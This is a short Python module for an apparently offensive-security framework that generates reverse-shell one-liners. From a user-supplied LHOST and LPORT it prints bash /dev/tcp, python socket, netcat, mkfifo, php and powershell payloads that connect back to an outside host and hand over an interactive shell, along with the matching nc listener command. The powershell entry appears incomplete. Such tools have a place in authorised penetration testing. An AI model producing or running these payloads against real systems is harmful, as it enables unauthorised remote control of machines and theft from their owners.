"""Генератор reverse-shell one-liner'ов."""
from framework import Module, C


class RevShell(Module):
    name = "revshell"
    description = "Generate reverse shell one-liners (bash/python/nc/ps)"
    author = "you"

    options = {
        "LHOST": {"value": None, "required": True, "description": "Your IP"},
        "LPORT": {"value": "4444","required": True, "description": "Your port"},
        "TYPE": {"value": "bash","required": False,"description": "bash|bash2|python|nc|nc_mkfifo|php|powershell"},
    }

    def run(self):
        lh, lp, t = self.get("LHOST"), self.get("LPORT"), self.get("TYPE").lower()
        payloads = {
            "bash": f"bash -i >& /dev/tcp/{lh}/{lp} 0>&1",
            "bash2": f"bash -c 'bash -i >& /dev/tcp/{lh}/{lp} 0>&1'",
            "python": f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{lh}\",{lp}));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'",
            "nc": f"nc -e /bin/sh {lh} {lp}",
            "nc_mkfifo": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lh} {lp} >/tmp/f",
            "php": f"php -r '$sock=fsockopen(\"{lh}\",{lp});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "powershell": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{lh}\",{lp})",
        }
        if t not in payloads:
            print(f"{C.R}Unknown type '{t}'. Available: {', '.join(payloads)}{C.END}")
            return
        print(f"\n{C.G}{payloads[t]}{C.END}\n")
        print(f"{C.DIM}Run: listener {lp} (или nc -lvnp {lp}){C.END}")
